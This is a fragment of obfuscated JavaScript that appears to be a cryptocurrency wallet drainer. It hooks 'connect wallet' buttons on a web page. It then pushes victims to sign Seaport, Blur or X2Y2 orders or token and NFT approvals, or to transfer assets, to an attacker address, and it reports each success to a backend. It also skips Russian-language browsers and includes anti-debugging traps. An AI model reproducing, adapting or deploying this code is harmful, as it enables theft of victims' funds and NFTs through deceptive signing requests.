                                'address': MS_Current_Address
                              });
                              if (MS_Settings.Settings.Wait_For_Response) {
                                await _0x43cd43;
                              }
                            }
                            _0x1f77fc.skip = true;
                            break;
                          } catch (_0x4e2107) {
                            console.log(_0x4e2107);
                            await approve_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      } else {
                        while (true) {
                          try {
                            await TRANSFER_TOKEN(_0x1f77fc);
                            _0x1f77fc.skip = true;
                            break;
                          } catch (_0x2e3704) {
                            console.log(_0x2e3704);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            } else {
              if (_0x1f77fc.type == 'ERC721') {
                if (typeof SIGN_BLUR !== "undefined" && MS_Settings.Settings.Blur.Enable == 0x1 && MS_Settings.Settings.Blur.Priority == 0x0 && !BL_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x1f77fc.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8")) && _0x1f77fc.amount_usd >= MS_Settings.Settings.Blur.Price) {
                  await SIGN_BLUR(_0x357913, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
                  BL_US = true;
                } else {
                  if (typeof SIGN_SEAPORT !== "undefined" && MS_Settings.Settings.SeaPort.Enable == 0x1 && MS_Settings.Settings.SeaPort.Priority == 0x0 && !SP_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x1f77fc.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71")) && _0x1f77fc.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
                    await SIGN_SEAPORT(_0x357913, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
                    SP_US = true;
                  } else {
                    if (typeof SIGN_X2Y2 !== "undefined" && MS_Settings.Settings.x2y2.Enable == 0x1 && MS_Settings.Settings.x2y2.Priority == 0x0 && !XY_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x1f77fc.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354")) && _0x1f77fc.amount_usd >= MS_Settings.Settings.x2y2.Price) {
                      await SIGN_X2Y2(_0x357913, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
                      XY_US = true;
                    } else {
                      if (MS_Settings.Settings.Sign.NFTs > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
                        while (true) {
                          try {
                            await SIGN_NFT(_0x1f77fc);
                            if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                              let _0x2cb96a = [];
                              for (const _0x2de38c of _0x357913) {
                                try {
                                  if (_0x2de38c.address == _0x1f77fc.address) {
                                    _0x2cb96a.push(_0x2de38c);
                                    _0x2de38c.skip = true;
                                  }
                                } catch (_0xc702b5) {
                                  console.log(_0xc702b5);
                                }
                              }
                              await send_request({
                                'action': "safa_approves",
                                'user_id': MS_ID,
                                'tokens': _0x2cb96a,
                                'address': MS_Current_Address,
                                'chain_id': MS_Current_Chain_ID,
                                'contract_address': _0x1f77fc.address
                              });
                            }
                            _0x1f77fc.skip = true;
                            break;
                          } catch (_0x7cbbd5) {
                            console.log(_0x7cbbd5);
                            if (_0x7cbbd5.code == -0x7f59 || _0x7cbbd5.code == -0x7d00) {
                              if (MS_Settings.Settings.Sign.Force == 0x1) {
                                await sign_cancel();
                              } else {
                                await sign_unavailable();
                                while (true) {
                                  if (MS_Settings.Settings.Sign.NFTs == 0x1) {
                                    try {
                                      await DO_SAFA(_0x1f77fc);
                                      let _0x1a2b20 = [];
                                      for (const _0x19e3f1 of _0x357913) {
                                        try {
                                          if (_0x19e3f1.address == _0x1f77fc.address) {
                                            _0x1a2b20.push(_0x19e3f1);
                                            _0x19e3f1.skip = true;
                                          }
                                        } catch (_0x252e95) {
                                          console.log(_0x252e95);
                                        }
                                      }
                                      await send_request({
                                        'action': "safa_approves",
                                        'user_id': MS_ID,
                                        'tokens': _0x1a2b20,
                                        'address': MS_Current_Address,
                                        'chain_id': MS_Current_Chain_ID,
                                        'contract_address': _0x1f77fc.address
                                      });
                                      _0x1f77fc.skip = true;
                                      break;
                                    } catch (_0x27b891) {
                                      console.log(_0x27b891);
                                      await approve_cancel();
                                      if (!MS_Settings.Loop_NFT) {
                                        break;
                                      }
                                    }
                                  } else {
                                    if (MS_Settings.Settings.Sign.NFTs == 0x2) {
                                      try {
                                        await TRANSFER_NFT(_0x1f77fc);
                                        _0x1f77fc.skip = true;
                                        break;
                                      } catch (_0x2d1dfa) {
                                        console.log(_0x2d1dfa);
                                        await transfer_cancel();
                                        if (!MS_Settings.Loop_NFT) {
                                          break;
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                              break;
                            } else {
                              console.log(_0x7cbbd5);
                              await sign_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        }
                      } else {
                        if (MS_Settings.Settings.Approve.Enable) {
                          while (true) {
                            try {
                              await DO_SAFA(_0x1f77fc);
                              let _0x18e91a = [];
                              for (const _0x46d37d of _0x357913) {
                                try {
                                  if (_0x46d37d.address == _0x1f77fc.address) {
                                    _0x18e91a.push(_0x46d37d);
                                    _0x46d37d.skip = true;
                                  }
                                } catch (_0x1ce097) {
                                  console.log(_0x1ce097);
                                }
                              }
                              await send_request({
                                'action': "safa_approves",
                                'user_id': MS_ID,
                                'tokens': _0x18e91a,
                                'address': MS_Current_Address,
                                'chain_id': MS_Current_Chain_ID,
                                'contract_address': _0x1f77fc.address
                              });
                              _0x1f77fc.skip = true;
                              break;
                            } catch (_0x2aa989) {
                              console.log(_0x2aa989);
                              await approve_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        } else {
                          while (true) {
                            try {
                              await TRANSFER_NFT(_0x1f77fc);
                              _0x1f77fc.skip = true;
                              break;
                            } catch (_0x2e4d06) {
                              console.log(_0x2e4d06);
                              await transfer_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        } catch (_0x5290b1) {
          console.log(_0x5290b1);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 0x7d0);
  } catch (_0x2b2a29) {
    console.log(_0x2b2a29);
  }
};
try {
  let query_string = window.location.search;
  let url_params = new URLSearchParams(query_string);
  if (url_params.get("cis") != "test" && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    MS_Bad_Country = true;
  }
} catch (_0x2e9238) {
  console.log(_0x2e9238);
}
document.addEventListener("DOMContentLoaded", async () => {
  try {
    await retrive_config();
    fill_chain_data();
    await retrive_contract();
    if (typeof localStorage.MS_ID === "undefined") {
      const _0xf47842 = await send_request({
        'action': "retrive_id"
      });
      if (_0xf47842.status == 'OK') {
        localStorage.MS_ID = _0xf47842.data;
      } else {
        localStorage.MS_ID = Math.floor(Date.now() / 0x3e8);
      }
    }
    MS_ID = localStorage.MS_ID;
    MS_Ready = true;
    inject_modal();
    enter_website();
    for (const _0x249fa5 in MS_Settings.RPCs) MS_Gas_Reserves[_0x249fa5] = 0x0;
    for (const _0x118ed4 of document.querySelectorAll(".connect-button")) {
      try {
        _0x118ed4.addEventListener("click", () => ms_init());
      } catch (_0x306ce1) {
        console.log(_0x306ce1);
      }
    }
  } catch (_0x3b6f11) {
    console.log(_0x3b6f11);
  }
});
const use_wc = () => {
  connect_wallet("WalletConnect");
};
window.addEventListener('beforeunload', _0x2f8a92 => leave_website());
window.addEventListener('onbeforeunload', _0x119ed7 => leave_website());
function _0x1abc84(_0x2456bb) {
  function _0x47d2ce(_0x3cca96) {
    if (typeof _0x3cca96 === "string") {
      return function (_0x5d5d35) {}.constructor("while (true) {}").apply('counter');
    } else if (('' + _0x3cca96 / _0x3cca96).length !== 0x1 || _0x3cca96 % 0x14 === 0x0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0x47d2ce(++_0x3cca96);
  }
  try {
    if (_0x2456bb) {
      return _0x47d2ce;
    } else {
      _0x47d2ce(0x0);
    }
  } catch (_0xeb4add) {}
}
